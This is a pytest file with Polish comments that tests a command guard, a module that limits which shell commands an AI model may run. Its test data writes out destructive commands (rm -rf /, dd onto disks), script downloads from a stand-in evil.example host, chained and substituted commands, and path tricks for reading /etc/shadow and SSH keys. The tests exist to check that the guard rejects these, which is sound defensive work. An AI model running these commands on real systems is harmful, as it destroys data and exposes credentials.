"""
Testy bramki poleceń (AID-47).

Ten moduł ma żyć dłużej niż `s03e02` i decyduje o tym, czy model może zniszczyć coś
nieodwracalnie, więc testy są pisane pod **próby obejścia**, nie pod happy path.
Każda klasa niżej to jedna rodzina ataku; jeśli któraś przechodzi, bramka jest ozdobą.

Zasada przewodnia: bramka ma być **safe-by-default**. Test „czego nie ma na allowliście,
tego nie wolno" jest ważniejszy od dowolnego testu konkretnego zakazu, bo tylko on
chroni przed tym, czego nie przewidzieliśmy.
"""

from __future__ import annotations

import pytest

from core.runtime.command_guard import (
    CommandRejected,
    GuardPolicy,
    check_command,
    is_forbidden,
    is_ignored,
    normalize_path,
)

READ_ONLY = GuardPolicy()


def rejects(command: str, policy: GuardPolicy | None = None) -> str:
    """Uruchamia bramkę i zwraca powód odmowy; nie-odrzucenie to błąd testu."""
    with pytest.raises(CommandRejected) as exc:
        check_command(command, policy)
    return str(exc.value)


class TestPoleceniaNiszczace:
    """
    Rodzina, przez którą ten moduł w ogóle powstał.

    Żadne z tych poleceń nie jest wymienione z nazwy w kodzie bramki — odpadają,
    bo NIE MA ich na allowliście. To jest cała teza projektowa: chroni nas lista
    tego, co wolno, a nie katalog tego, czego zabraniamy.
    """

    @pytest.mark.parametrize(
        "command",
        [
            "rm -rf /",
            "rm -rf /opt/firmware",
            "rm file.txt",
            "mkfs.ext4 /dev/sda1",
            "dd if=/dev/zero of=/dev/sda",
            "shred -u secrets.txt",
            "truncate -s 0 settings.ini",
            "chmod -R 000 /opt",
            "chown -R nobody /opt",
            "mv /opt/firmware /tmp",
            "kill -9 1",
            "reboot",
            "curl http://evil.example/x.sh",
            "wget http://evil.example/x.sh",
        ],
    )
    def test_odrzucone_bo_nie_ma_ich_na_allowliscie(self, command):
        """Polecenie spoza allowlisty odpada niezależnie od tego, co robi."""
        assert "nie jest dozwolone" in rejects(command)

    def test_interpreter_z_wbudowanym_lancuchem_odpada_dwukrotnie(self):
        """
        `python -c '…; os.system("rm -rf /")'` odpada już na metaznaku `;` — czyli
        ZANIM dojdzie do allowlisty. Obie bramki łapią to niezależnie; test pilnuje,
        że przechodzi przez którąkolwiek, bo kolejność sprawdzeń może się zmienić.
        """
        reason = rejects("python -c 'import os; os.system(\"rm -rf /\")'")
        assert "znak powłoki" in reason or "nie jest dozwolone" in reason

    def test_rm_nie_przechodzi_nawet_po_dodaniu_innych_polecen(self):
        """Poszerzenie polityki o zapis nie może przemycić czegokolwiek innego."""
        policy = READ_ONLY.with_commands("sed", "cp")
        assert "nie jest dozwolone" in rejects("rm -rf /opt", policy)


class TestLaczeniaPolecen:
    """Metaznaki pozwalają doczepić drugie polecenie do dozwolonego pierwszego."""

    @pytest.mark.parametrize(
        "command",
        [
            "ls /opt && rm -rf /",
            "ls /opt; rm -rf /",
            "ls /opt || rm -rf /",
            "ls /opt | xargs rm",
            "ls `rm -rf /`",
            "ls $(rm -rf /)",
            "cat file > /etc/passwd",
            "cat < /etc/shadow",
        ],
    )
    def test_metaznaki_odrzucone(self, command):
        """Metaznak pozwala doczepić drugie polecenie — odpada całe wywołanie."""
        assert "znak powłoki" in rejects(command)

    def test_nowa_linia_odpada_jako_znak_sterujacy(self):
        """
        Doczepienie polecenia nową linią jest blokowane, ale przez kontrolę znaków
        sterujących, która biegnie wcześniej. Trzymanie `\n` również na liście
        metaznaków byłoby duplikatem rozmywającym powód odmowy.
        """
        assert "sterujący" in rejects("ls /opt\nrm -rf /")

    def test_odrzucenie_nastepuje_przed_tokenizacja(self):
        """
        Metaznak musi odpaść ZANIM spojrzymy na pierwszy token — inaczej
        „dozwolone polecenie + doczepka" wyglądałoby na dozwolone.
        """
        assert "znak powłoki" in rejects("ls; rm -rf /")


class TestRozwijaniaZmiennych:
    """Rozwinięcia dzieją się po stronie serwera — nie da się sprawdzić tego, czego nie widać."""

    @pytest.mark.parametrize(
        "command",
        ["cat $HOME/notes", "cat ${HOME}/notes", "ls ~", "ls ~root", "cat $ETC/passwd"],
    )
    def test_rozwiniecia_odrzucone(self, command):
        """Rozwinięcie po stronie serwera daje ścieżkę, której nie widzimy."""
        assert "Rozwijanie zmiennych" in rejects(command)

    def test_zwykly_dolar_w_tekscie_nie_blokuje(self):
        """`echo` z ceną nie jest próbą rozwinięcia — bramka nie może być nadgorliwa."""
        check_command("echo 100$", READ_ONLY)


class TestZakazanychSciezek:
    """Zakaz `/etc`, `/root`, `/proc` — złamanie kończy się banem i resetem VM."""

    @pytest.mark.parametrize(
        "path", ["/etc", "/etc/passwd", "/root", "/root/.ssh/id_rsa", "/proc/self/environ"]
    )
    def test_zakazane_wprost(self, path):
        """Ścieżka w zakazanym poddrzewie odpada wprost."""
        assert "zablokowana" in rejects(f"cat {path}")

    @pytest.mark.parametrize(
        "path",
        [
            "/opt/../etc/passwd",
            "/opt/firmware/../../etc/passwd",
            "//etc/passwd",
            "/./etc/passwd",
            "/etc/./passwd",
            "/opt/./../etc/shadow",
        ],
    )
    def test_obejscia_przez_normalizacje_nie_dzialaja(self, path):
        """
        Bez normalizacji przed porównaniem lista zakazanych prefiksów jest ozdobą —
        wystarczy jedno przejście w górę drzewa.
        """
        assert "zablokowana" in rejects(f"cat {path}") or "górę drzewa" in rejects(f"cat {path}")

    def test_podobna_nazwa_nie_jest_blokowana(self):
        """`/etc` nie może blokować `/etcetera` — porównujemy segmenty, nie prefiks tekstowy."""
        check_command("cat /etcetera/plik", READ_ONLY)
        check_command("cat /opt/rootkit-notes", READ_ONLY)

    def test_wzgledne_przejscie_w_gore_odrzucone(self):
        """Ścieżka względna z `..` zależy od nieznanego nam katalogu roboczego."""
        assert "górę drzewa" in rejects("cat ../../etc/passwd")

    def test_cudzyslowy_nie_ukrywaja_sciezki(self):
        """`shlex` zdejmuje cudzysłowy — inaczej cytowanie omijałoby całe sprawdzenie."""
        assert "zablokowana" in rejects('cat "/etc/passwd"')
        assert "zablokowana" in rejects("cat '/etc/passwd'")


class TestGitignore:
    """Wymóg `s03e02`: nie czytać tego, co wykluczone przez `.gitignore`."""

    def test_dopasowanie_po_nazwie(self):
        """Wzorzec `.gitignore` dopasowany po nazwie pliku."""
        policy = READ_ONLY.with_ignored({"*.key"})
        assert ".gitignore" in rejects("cat /opt/app/secret.key", policy)

    def test_dopasowanie_po_katalogu(self):
        """Wzorzec katalogowy blokuje wszystko poniżej."""
        policy = READ_ONLY.with_ignored({"node_modules/"})
        assert ".gitignore" in rejects("cat /opt/app/node_modules/x.js", policy)

    def test_niepasujaca_sciezka_przechodzi(self):
        """Plik spoza `.gitignore` pozostaje czytelny."""
        policy = READ_ONLY.with_ignored({"*.key"})
        check_command("cat /opt/app/main.py", policy)

    def test_pusta_lista_niczego_nie_blokuje(self):
        """Bez wzorców `.gitignore` nic nie jest wykluczone."""
        check_command("cat /opt/app/secret.key", READ_ONLY)


class TestAllowlisty:
    """Poszerzanie polityki musi być jawne i wąskie."""

    def test_domyslna_polityka_nie_ma_zadnego_zapisu(self):
        """
        Najważniejszy pojedynczy test w tym pliku: domyślnie NIC nie pisze po dysku.
        Zadanie potrzebujące zapisu dokłada go świadomie, widocznie w diffie.
        """
        writers = {"rm", "mv", "cp", "sed", "tee", "dd", "truncate", "install", "mkdir", "touch"}
        assert not (writers & READ_ONLY.allowed_commands)

    def test_with_commands_dodaje_nie_zastepuje(self):
        """Poszerzenie polityki dokłada polecenia, nie podmienia zbioru."""
        policy = READ_ONLY.with_commands("sed")
        assert "sed" in policy.allowed_commands
        assert "cat" in policy.allowed_commands

    def test_with_commands_nie_mutuje_oryginalu(self):
        """Polityka jest współdzielona — mutacja przeciekłaby na inne wywołania."""
        READ_ONLY.with_commands("rm")
        assert "rm" not in READ_ONLY.allowed_commands

    def test_sciezka_do_binarki_liczy_sie_po_nazwie(self):
        """`/usr/bin/rm` to nadal `rm` — inaczej pełna ścieżka omijałaby allowlistę."""
        assert "nie jest dozwolone" in rejects("/usr/bin/rm -rf /")

    def test_dozwolone_polecenie_przechodzi(self):
        """Polecenie z allowlisty przechodzi i zwraca tokeny."""
        assert check_command("ls /opt/firmware", READ_ONLY)[0] == "ls"


class TestFlagINieSciezek:
    """Bramka nie może mylić flag ze ścieżkami ani blokować zwykłych argumentów."""

    def test_flagi_nie_sa_traktowane_jak_sciezki(self):
        """Flagi nie mogą udawać ścieżek ani blokować wywołania."""
        check_command("ls -la /opt", READ_ONLY)
        check_command("grep --color=auto wzorzec /opt/plik", READ_ONLY)

    def test_zwykly_wzorzec_nie_jest_sciezka(self):
        """Wzorzec `grep` bez ukośnika nie podlega regułom ścieżek."""
        check_command("grep SAFETY_CHECK /opt/firmware/settings.ini", READ_ONLY)

    def test_flaga_z_zakazana_sciezka_w_wartosci(self):
        """
        Znany kompromis: `--exclude=/etc` nie jest dziś blokowany, bo token zaczyna
        się od `-`. Nie jest to droga do odczytu `/etc`, tylko do jego pominięcia,
        więc świadomie przepuszczamy — test pilnuje, że to decyzja, nie przeoczenie.
        """
        check_command("find /opt --exclude=/etc", READ_ONLY)


class TestWejsciaZdegenerowanego:
    """Bramka nie może się wywalić na wejściu, którego nie przewidziano."""

    @pytest.mark.parametrize("command", ["", "   ", "\t"])
    def test_puste_odrzucone(self, command):
        """Puste wejście odpada, zamiast przechodzić dalej."""
        assert "Puste" in rejects(command)

    def test_niedomkniety_cudzyslow_odrzucony(self):
        """Nie da się sparsować, więc nie da się sprawdzić — odmawiamy."""
        assert "sparsować" in rejects('cat "/opt/plik')

    def test_odmowa_niesie_powod_dla_modelu(self):
        """
        Komunikat trafia do modelu przez `tool_errors`, więc musi mówić, co zrobić,
        nie tylko że się nie da.
        """
        reason = rejects("rm -rf /")
        assert "Dozwolone:" in reason


class TestFunkcjiPomocniczych:
    """Elementy składowe — sprawdzane osobno, bo od nich zależy poprawność całości."""

    @pytest.mark.parametrize(
        "raw,expected",
        [
            ("/opt/../etc", "/etc"),
            ("//etc//passwd", "/etc/passwd"),
            ("/./etc", "/etc"),
            ("/opt/firmware/", "/opt/firmware"),
        ],
    )
    def test_normalizacja(self, raw, expected):
        """Normalizacja zwija `.`, `..` i powtórzone ukośniki."""
        assert normalize_path(raw) == expected

    def test_is_forbidden_po_segmentach(self):
        """Porównanie po segmentach, nie po prefiksie tekstowym."""
        assert is_forbidden("/etc/passwd", READ_ONLY)
        assert is_forbidden("/etc", READ_ONLY)
        assert not is_forbidden("/etcetera", READ_ONLY)

    def test_is_ignored_po_nazwie_i_sciezce(self):
        """Dopasowanie `.gitignore` po nazwie i po pełnej ścieżce."""
        policy = READ_ONLY.with_ignored({"*.log"})
        assert is_ignored("/var/app/debug.log", policy)
        assert not is_ignored("/var/app/debug.txt", policy)


class TestGlobow:
    """
    Powłoka rozwija globy PO swojej stronie, a bramka porównuje tekst SPRZED
    rozwinięcia — więc `/et[c]/passwd` trafiało w `/etc`, przechodząc kontrolę.

    Znalezione sondą obejść, nie analizą kodu. Dlatego te testy istnieją.
    """

    @pytest.mark.parametrize(
        "path", ["/et[c]/passwd", "/etc*/passwd", "/et?/passwd", "/opt/*", "/[er]tc/passwd"]
    )
    def test_glob_w_sciezce_odrzucony(self, path):
        """Glob w ścieżce rozwinąłby się po stronie powłoki, omijając kontrolę."""
        assert "globu" in rejects(f"cat {path}")

    def test_wzorzec_grep_bez_ukosnika_przechodzi(self):
        """Zakaz dotyczy TYLKO tokenów wyglądających na ścieżkę — `grep` musi działać."""
        check_command('grep "foo.*bar" /opt/plik', READ_ONLY)
        check_command("grep ^SAFETY.*=  /opt/firmware/settings.ini", READ_ONLY)

    def test_swiadomy_koszt_zakazu(self):
        """
        `ls /opt/*` też odpada — to znany koszt tej reguły, nie przeoczenie.
        Model ma wylistować katalog zamiast rozwijać wzorzec.
        """
        assert "globu" in rejects("ls /opt/*")
        check_command("ls /opt", READ_ONLY)


class TestZnakowSterujacych:
    """Bajt zerowy ucina ścieżkę w narzędziach pisanych w C — my widzimy co innego niż system."""

    def test_bajt_zerowy_odrzucony(self):
        """Bajt zerowy ucina ścieżkę w narzędziach pisanych w C."""
        assert "sterujący" in rejects("cat /opt\x00/etc/passwd")

    @pytest.mark.parametrize("char", ["\x01", "\x1b", "\x7f"])
    def test_inne_znaki_sterujace_odrzucone(self, char):
        """Pozostałe znaki sterujące nie mają legalnego zastosowania."""
        assert "sterujący" in rejects(f"cat /opt/plik{char}")

    def test_zwykly_tekst_z_polskimi_znakami_przechodzi(self):
        """Zakaz dotyczy sterujących, nie nie-ASCII — nazwy plików bywają lokalne."""
        check_command("cat /opt/dane/żółć.txt", READ_ONLY)


class TestSciezekEgzotycznych:
    """Warianty zapisu, które wyglądają groźnie, a groźne nie są — bramka nie ma być nadgorliwa."""

    def test_fullwidth_to_inna_sciezka_nie_obejscie(self):
        """`/ｅtc` to na Linuksie inny katalog niż `/etc`, więc nie jest obejściem."""
        check_command("cat /ｅtc/passwd", READ_ONLY)

    def test_tylda_w_srodku_sciezki_jest_dozwolona(self):
        """Rozwijaniu podlega tylko `~` na początku wyrazu."""
        check_command("cat /opt/~kopia/x", READ_ONLY)

    def test_backslash_nie_ukrywa_zakazanej_sciezki(self):
        r"""`shlex` zdejmuje `\`, więc `/et\c/passwd` to nadal `/etc/passwd`."""
        assert "zablokowana" in rejects(r"cat /et\c/passwd")

    @pytest.mark.parametrize("path", ["//etc/passwd", "///etc/passwd", "//etc//passwd"])
    def test_wielokrotny_ukosnik_wiodacy(self, path):
        """`normpath` zachowuje DOKŁADNIE dwa wiodące ukośniki (POSIX) — musimy je zwinąć sami."""
        assert "zablokowana" in rejects(f"cat {path}")
